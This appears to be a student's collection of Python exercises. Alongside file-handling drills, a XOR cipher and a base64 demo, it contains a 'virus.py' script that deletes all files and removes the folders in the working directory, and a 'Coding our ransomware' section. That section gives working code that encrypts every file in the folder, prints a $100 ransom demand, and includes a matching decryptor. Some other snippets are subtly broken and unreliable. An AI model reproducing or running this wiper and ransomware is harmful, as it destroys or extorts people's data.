
```python

def get_cidr_notation(ip_class):
    if ip_class == "A":
        return "/8"
    elif ip_class == "B":
        return "/16"
    elif ip_class == "C":
        return "/24"
    else:
        return "Invalid IP class Use A, B, or C."

if name == "main":
    ip_address = input("Enter the IP address: ")
    ip_class = input("Enter the IP class (A, B, or C): ")

    cidr_notation = get_cidr_notation(ip_class)
    print(f"CIDR notation: {cidr_notation}"
```


```python
import os

files=[]
folders=[]

for fil in os.listdir():
   if fil != "virus.py": 
       if os.path.isfile(fil):
           files.append(fil)
       else :
            folders.append(fil)
   else :
       pass

for i in files:
    os.remove(i)
for j in folders:
    os.removedirs(j)

```

```python
import os
for i in range(1,21):
     os.system(f"touch virus_{i}")
print("files created")
```


Exercise 2 
1. Write a program That can Create And write “This is My file” text 
    -  Implement file exist error bypass method. 
```python

import os

urr=input('continue-c/exit-e - ')
if urr=='c':
    ur=input('create new file - ')
    while urr=='c':
        try:
            with open(ur ,'x') as cr: 
                cr.write('This is My file')
        except:
             print('the file already existed! make new file') 
             urr=input('\ncreate/exit(c/e) - ')
else:
    print('\nnot created')


```

2. Write a program that can Create a file on The Desktop 
     - Add the desktop path with the filename “~/Desktop/hello.txt” 
```python
import os

a='t'
while a=='t':
    user=input('\n create a file on the desktop - ')
    ul=os.path.expanduser(f'~/Desktop/{user}')
    try:
        with open(ul,'x') as l:
            l.write('this file is created based on location ')
            print('\n file created on a Desktop')
            break
    except:
        print('\n file already existed!')
        us=input('\n try_new/exit - t/e ')
        if us!='t':
           break
        
    
    
```


3. Write a program that can Read File some random text file. 
     - Accepts input and read that file 
```python
import os
a='continue'
while a=='continue':
    try:
        us=input('\n Enter the file path - ')
        f=os.path.expanduser(us)

     
        with open(f,'r') as ra:
            print(ra.read())
    except:
        print('incorrct filepath')  
        
    try:          
        user=input('\n continue/exit - ')
  
        if a!=user:
            break
    except:
        print('enter 1 - to read more or 0 - to exit')        


```

4. Write a program that can delete File if it exist. 
    -  Use os package
```python
import os

a='continue'
ur=input('\n continue/exit - ')
while ur==a:
    user=input('\n enter any file u wanna delete - ')
    if os.path.exists(user):
        os.remove(user)
        print('\n removed successfully')
        ur=input('continue/exit - ')
        if a!=ur:
           break
    else:
        print('file does not exits')

```


##### Coding our ransomware
- encrypt
```python
import os
from cryptography.fernet import Fernet

files=[]

key = Fernet.generate_key()

with open('masterkey.key','xb') as mykey:
    mykey.write(key)

for fil in os.listdir():
    if fil!='masterkey.key' and os.path.isfile(fil) and fil!='ransomewareD.py' and fil!= 'ransomewareE.py':
        files.append(fil)
        
for fl in files:
    with open(fl,'rb') as content:
        a=content.read()
    encrypt=Fernet(key).encrypt(a)
    
    with open(fl,'wb') as encry_file:
        encry_file.write(encrypt)
print('YOUR FILES ARE ENCRYPTED!! \n PAY $100 AT @MAHNET AND GET YOUR FILES!!')

```

- decrypt
```python
import os 
from cryptography.fernet import Fernet

files=[]

with open('masterkey.key','rb') as mykey:
    key=mykey.read()
    
for fil in os.listdir():
    if fil!='masterkey.key' and os.path.isfile(fil) and fil!= 'ransomewareE.py' and fil!='ransomewareD.py':
        files.append(fil)
    
for fl in files:
    with open(fl,'rb') as content:
        a=content.read()
    
    decrypt=Fernet(key).decrypt(a)
    
    with open(fl,'wb') as decry_file:
       decry_file.write(decrypt)
   
print('YOUR FILES ARE DECRYPTED!! \n THANKYOU FOR PAYING!!')
```


```python
def encrypt():
    msg=input('message: ')
    key=input('key: ')
    encrypt_hex=''
    key_itr=0
    for i in range(len(msg)):
        deciText=ord(msg[i]) ^ ord(key[key_itr])
        key_itr+=1
        if key_itr >= len(key):
            key_itr = 0
        
        encrypt_hex += hex(deciText)[2:]
        
    print(f'message encrypted successfully!\nmessage: {encrypt_hex}')
    

def decrypt():
    msg=input('message: ')
    key=input('key: ')
    hex2uni= ''
    key_itr=0
    decrypt_text=''
    for i in range(0, len(msg), 2):
        hex2uni+=bytes.fromhex(msg[i:i+2]).decode('utf-8')
        
    for i in range(len(hex2uni)):
        temp=ord(hex2uni[i]) ^ ord(key[key_itr])
        decrypt_text+=chr(temp)
        key_itr+=1
        if key_itr>=len(key):
            key_itr=0
    print(f'the decrypted message is:\n{decrypt_text}')
    
    
print('welcome to mahEncrypter.')
print('=========================')
user=input('what do you want to do \n 1) Encrypt \n 2) Decrypt\n>>')
if user=='1':
    encrypt()
elif user=='2':
    decrypt()
else:
    print('error, no input!')
```


```python
import base64 as b64
msg=input('text: ')
encoded= base64.b64encode(bytes(msg,'utf-8'))
print(encoded)

decoded=base64.b64decode(encoded)
print(decoded)


```
